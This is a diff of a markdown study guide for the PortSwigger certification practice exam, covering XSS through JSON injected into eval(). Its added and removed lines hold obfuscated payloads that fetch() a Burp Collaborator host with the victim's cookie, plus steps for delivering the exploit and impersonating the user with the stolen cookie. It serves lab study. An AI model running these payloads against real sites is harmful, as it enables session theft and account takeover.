@@ -578,11 +578,11 @@ ${alert(document.cookie)}
 
 ### XSS via JSON into EVAL  
 
->This application is performing search function and the **DOM Invader** identify the sink in an ` eval()` function. The search results are placed into JSON content type.  
+>This [PortSwigger Practice Exam APP](https://portswigger.net/web-security/certification/takepracticeexam/index.html) is performing search function and the **DOM Invader** ***identify*** the sink in an ` eval() ` function. The search results are placed into JSON content type.  
 
 ![Dom Invader EVAL identify](images/dom-invader-eval-identify.png)  
 
->To test escape of the `JSON` data and inject test payload `"-prompt(321)-"` in to JSON content.  
+>Test escape out of the `JSON` data and inject test payload `"-prompt(321)-"` into the JSON content.  
 
 ![json-injection-escape.png](images/json-injection-escape.png)  
 
@@ -626,28 +626,29 @@ ZmV0Y2goYGh0dHBzOi8vNHo0YWdlMHlwYjV3b2I5cDYxeXBwdTEzdnUxbHBiZDAub2FzdGlmeS5jb20v
   + setImmediate("code")
   + Function("code")()
   
->This image shows Burp Collaborator receiving the victim cookie value.  
+>This image shows Burp Collaborator receiving the my cookie value as proof of concept before setting up payload to `Deliver exploit to victim`.  
 
 ![Burp collaborator receiving request with base64 cookie value from our POC.](images/xss2.png)  
 
->Hosting the **IFRAME** with eval() and fetch() payload on exploit server, respectively base64 encoded and URL encoded.  
+>[URL Encode](https://www.urlencoder.org/) all characters in this payload and use as the value of the `searchterm` parameter.  
 
 ```html
-<iframe src="https://TARGET.net/?SearchTerm=%22%2b%65%76%61%6c%28%61%74%6f%62%28%22%5a%6d%56%30%59%32%67%6f%49%6d%68%30%64%48%42%7a%4f%69%38%76%4f%44%4d%35%59%32%74%30%64%54%64%31%62%32%64%6c%5a%47%30%32%59%54%46%72%61%6e%56%35%4d%32%39%31%64%47%78%36%59%32%34%79%59%6e%49%75%62%32%46%7a%64%47%6c%6d%65%53%35%6a%62%32%30%76%50%32%4d%39%49%69%41%72%49%47%4a%30%62%32%45%6f%5a%47%39%6a%64%57%31%6c%62%6e%52%62%4a%32%4e%76%62%32%74%70%5a%53%64%64%4b%53%6b%3d%22%29%29%7d%2f%2f"/>
-```
+"-eval(atob("ZmV0Y2goYGh0dHBzOi8vNHo0YWdlMHlwYjV3b2I5cDYxeXBwdTEzdnUxbHBiZDAub2FzdGlmeS5jb20vP2pzb25jPWAgKyB3aW5kb3dbImRvY3VtZW50Il1bImNvb2tpZSJdKQ=="))-"
+```  
+
+>Hosting the `IFRAME` on exploit server, give a **error** message refused to connect to target. Instead host the payload on exploit server between `<script>` tags.  
+
+```html
+<script>
+location = "https://0afa002e04d93d98c0ea08df00b90092.web-security-academy.net/?SearchTerm=%22%2d%65%76%61%6c%28%61%74%6f%62%28%22%5a%6d%56%30%59%32%67%6f%59%47%68%30%64%48%42%7a%4f%69%38%76%4e%48%6f%30%59%57%64%6c%4d%48%6c%77%59%6a%56%33%62%32%49%35%63%44%59%78%65%58%42%77%64%54%45%7a%64%6e%55%78%62%48%42%69%5a%44%41%75%62%32%46%7a%64%47%6c%6d%65%53%35%6a%62%32%30%76%50%32%70%7a%62%32%35%6a%50%57%41%67%4b%79%42%33%61%57%35%6b%62%33%64%62%49%6d%52%76%59%33%56%74%5a%57%35%30%49%6c%31%62%49%6d%4e%76%62%32%74%70%5a%53%4a%64%4b%51%3d%3d%22%29%29%2d%22"
+</script>
+```  
+
 ![(Deliver reflected xss to steal victim cookie.](images/xss1.png)  
 
->Decode above payload from URL encoding, is the following:  
+>**NOTE:** `Deliver exploit to victim` few times if the active user do not send HTTP request to collaborator. Replace the current cookie value with the stolen cookie to impersonate the active user.  
 
-```html
-https://TARGET.net/?SearchTerm="+eval(atob("ZmV0Y2goImh0dHBzOi8vODM5Y2t0dTd1b2dlZG02YTFranV5M291dGx6Y24yYnIub2FzdGlmeS5jb20vP2M9IiArIGJ0b2EoZG9jdW1lbnRbJ2Nvb2tpZSddKSk="))}//  
-```  
-
->Decode part of payload above that is base64 encoded to the following:  
-
-```html
-https://TARGET.net/?SearchTerm="+eval(atob("fetch("https://COLLABORATOR.NET/?c=" + btoa(document['cookie']))"))}//  
-```  
+[PortSwigger Practice Exam - Stage 1 - Foothold](https://portswigger.net/web-security/certification/takepracticeexam/index.html)  
   
 ### Stored XSS
 
